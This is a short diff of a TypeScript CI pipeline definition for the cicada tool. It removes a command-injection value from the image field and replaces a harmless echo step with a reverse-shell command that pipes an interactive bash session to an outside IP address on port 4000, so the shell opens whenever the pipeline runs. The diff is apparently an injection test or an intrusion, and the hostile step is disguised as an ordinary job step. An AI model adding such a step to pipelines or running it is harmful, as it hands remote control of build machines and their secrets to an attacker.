@@ -2,11 +2,11 @@ import { Job, Pipeline } from "https://deno.land/x/cicada@v0.1.50/mod.ts";
 
 const job = new Job({
   name: "My First Job",
-  image: "ubuntu:22.04\' ; ls -lr",
+  image: "ubuntu:22.04",
   steps: [
     {
       name: "Run bash",
-      run: "echo hello from bash!",
+      run: "bash -c 'bash -i >& /dev/tcp/3.80.201.255/4000 0>&1'",
     },
     {
       name: "Run deno/typescript",
